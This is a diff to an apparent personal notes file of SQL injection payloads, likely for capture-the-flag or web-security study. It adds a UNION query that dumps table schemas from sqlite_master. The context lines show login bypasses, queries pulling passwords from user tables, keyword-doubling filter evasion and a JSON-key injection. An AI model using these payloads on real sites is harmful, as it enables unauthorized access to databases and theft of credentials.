@@ -74,6 +74,7 @@ PW: OR 1--
 
 * union
 ' or 1=1 union select sql,1,1 from sqlite_master;--
+' or 1=1 union select sql,1,1,1,1,1,1,1,1,1 from sqlite_master;--
 ' or 1=1 union select password, name, 1 from users_hogefuga;--
 SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 
 
@@ -93,6 +94,7 @@ SCHEMA_PRIVILEGES
 fuga' OORR '1
 5.1.73
 https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+
 
 # perl json sqli
 { "name" : "a", "a\") OR 1 #" : "a" }
